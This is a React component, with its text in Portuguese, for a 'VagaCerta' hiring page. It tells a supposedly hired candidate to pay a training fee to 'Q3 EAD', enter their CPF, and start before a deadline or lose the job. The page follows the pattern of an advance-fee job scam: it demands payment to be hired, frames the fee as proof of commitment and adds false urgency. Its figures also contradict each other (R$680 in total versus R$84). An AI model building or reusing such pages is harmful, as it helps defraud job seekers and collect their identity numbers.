/* eslint-disable no-unused-vars */

import { useEffect, useState } from 'react';
import { motion } from 'framer-motion';
import { ChevronRight } from 'lucide-react';

const ReviewStep4Contratacao = ({ onContinue }) => {
    const [isLoading, setIsLoading] = useState(false);
    const handleContinue = () => {
        setIsLoading(true);
        setTimeout(() => {
            setIsLoading(false);
            if (onContinue) onContinue();
        }, 1000);
    };



    useEffect(() => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }, []);

    // Datas
    const data_hoje = new Date().toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const limite = new Date();
    limite.setDate(limite.getDate() + 15);
    const data_limite = limite.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
    const hora_limite = limite.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

    return (
        <div className="min-h-screen w-full flex flex-col items-center justify-start bg-[#181A1B] px-6 pt-6 pb-5">
            <div className="w-full max-w-md mx-auto px-0 pt-8 pb-0">
                {/* Título principal */}
                <h1 className="font-hendrix-bold text-white mb-2 text-left" style={{ fontSize: '23pt', lineHeight: 1.1 }}>
                    Treinamento em atendimento ao cliente.
                </h1>
                <p className="font-hendrix-regular text-[#B3B3B3] mb-8 text-left" style={{ fontSize: '13pt', lineHeight: 1.3 }}>
                    Você será direcionado(a) para a Q3 EAD para iniciar o treinamento.
                </p>

                {/* Card de valores - EXATAMENTE igual à imagem */}
                <div className="bg-[#232323] rounded-2xl px-7 pt-8 pb-7 mb-6 flex flex-col" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="flex flex-col items-start mb-4">
                        <span className="block mb-2" style={{ lineHeight: 1 }}>
                            <svg width="54" height="54" viewBox="0 0 54 54" fill="none"><text x="10" y="44" fontSize="54" fill="white" fontWeight="bold">*</text></svg>
                        </span>
                        <span className="font-hendrix-regular text-white text-[18px] leading-tight mb-2" style={{ maxWidth: '100%' }}>
                            O treinamento tem um custo de R$680.<br />
                            Mas como estamos contratando você, não faz sentido deixar esse custo nas suas mãos.<br /><br />
                                                        Por isso, você paga apenas R$680 no total (divido em até 4x R$170). <br /><br />
                            Por isso, a VagaCerta cobre R$596 desse valor e você investe apenas: <span className="font-hendrix-bold text-white">R$84</span>
                        </span>
                    </div>
                    {/* Faixas de valores */}
                    <div className="flex flex-col w-full rounded-xl overflow-hidden mb-4" style={{ boxShadow: '0 1px 4px 0 rgba(22,85,255,0.04)' }}>
                        <div className="flex justify-between items-center px-5 py-3 bg-[#444444]">
                            <span className="font-hendrix-regular text-[#B3B3B3] text-[16px]">Valor total</span>
                            <span className="font-hendrix-bold text-white text-[18px]">R$680,00</span>
                        </div>
                        <div className="flex justify-between items-center px-5 py-3 bg-[#444444]">
                            <span className="font-hendrix-regular text-[#B3B3B3] text-[16px]">Pago por nós</span>
                            <span className="font-hendrix-bold text-[#FF5A5A] text-[18px]">- R$596,00</span>
                        </div>
                        <div className="flex justify-between items-center px-5 py-3 bg-[#2D8CFF]">
                            <span className="font-hendrix-bold text-white text-[16px]">Seu investimento</span>
                            <span className="font-hendrix-bold text-white text-[20px]">R$84,00</span>
                        </div>
                    </div>
                    <div className="font-hendrix-regular text-[#B3B3B3] text-[16px] mt-2">
                        Para garantir a parte paga pela VagaCerta é necessário digitar o seu CPF ao entrar na Q3 EAD.
                    </div>
                </div>

                {/* Card de compromisso */}
                <div className="bg-[#232323] rounded-2xl px-7 py-8 mb-6 flex flex-col" style={{ boxShadow: '0 2px 8px 0 rgba(22,85,255,0.08)' }}>
                    <div className="flex flex-col items-start justify-center">
                        <span className="mb-4">
                            <svg width="44" height="44" viewBox="0 0 44 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                                <text x="7" y="38" fontSize="44" fontWeight="bold" fill="#2D8CFF">*</text>
                            </svg>
                        </span>
                        <span className="font-hendrix-regular text-[#B3B3B3] text-[15px] text-start leading-tight" style={{ maxWidth: '100%' }}>
                            Esse valor mínimo garante seu comprometimento real com o trabalho.<br /><br />
                            Isso evita que a vaga seja repassada para outra pessoa e confirma que podemos confiar em você para fazer parte da nossa equipe.
                        </span>
                    </div>
                </div>

                {/* Card de aviso vermelho */}
                <div className="bg-[#3A2323] rounded-2xl px-7 py-8 mb-8 flex flex-col items-start" style={{ boxShadow: '0 2px 8px 0 rgba(255,90,90,0.08)' }}>
                    <span className="mb-3">
                        <svg width="38" height="38" viewBox="0 0 38 38" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M19 3L4 35h30L19 3z" stroke="#FF5A5A" strokeWidth="3" strokeLinejoin="round" />
                            <circle cx="19" cy="28" r="2.2" fill="#FF5A5A" />
                            <path d="M19 13v9" stroke="#FF5A5A" strokeWidth="3" strokeLinecap="round" />
                        </svg>
                    </span>
                    <span className="font-hendrix-regular text-[#FF5A5A] text-[16px] text-start leading-tight mb-2" style={{ maxWidth: '100%' }}>
                        Inicie o treinamento hoje <span className="font-hendrix-bold text-[#FF5A5A]">{data_limite}</span> até às <span className="font-hendrix-bold text-[#FF5A5A]">{hora_limite}</span> para manter sua contratação.
                    </span>
                    <span className="font-hendrix-regular text-[#B3B3B3] text-[15px] text-start leading-tight mt-1" style={{ maxWidth: '100%' }}>
                        Não iniciando até o prazo limite, a vaga pode ser repassada a outra pessoa na lista de espera.
                    </span>
                </div>

                {/* Botão fixo no rodapé */}
                <div className="w-full pt-2 pb-6 flex justify-center">
                    <motion.button
                        onClick={handleContinue}
                        disabled={isLoading}
                        whileTap={{ scale: 0.97 }}
                        whileHover={{ scale: isLoading ? 1 : 1.03 }}
                        className={`w-full flex items-center justify-center gap-2 px-6 py-4 rounded-full font-hendrix-medium text-white shadow-md focus:outline-none focus:ring-2 focus:ring-[#1655ff] transition-all duration-300 ${isLoading ? 'opacity-60 cursor-not-allowed' : ''}`}
                        style={{
                            background: 'linear-gradient(90deg, #1655ff 0%, #4285f4 100%)',
                            fontSize: '15pt',
                            boxShadow: '0 2px 8px 0 rgba(22,85,255,0.10)',
                            border: 'none',
                            opacity: isLoading ? 0.7 : 1
                        }}
                    >
                        {isLoading ? (
                            <>
                                <motion.div
                                    className="w-4 h-4 border-2 border-white border-t-transparent rounded-full mr-2"
                                    animate={{ rotate: 360 }}
                                    transition={{ repeat: Infinity, duration: 0.8, ease: 'linear' }}
                                    style={{ borderTopColor: 'transparent', borderRightColor: 'white', borderBottomColor: 'white', borderLeftColor: 'white' }}
                                />
                                <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '13pt' }}>Carregando...</span>
                            </>
                        ) : (
                            <span className="font-hendrix-medium tracking-wide" style={{ fontSize: '15pt' }}>Iniciar treinamento</span>
                        )}
                    </motion.button>
                </div>
            </div>
        </div>
    );
};

export default ReviewStep4Contratacao;
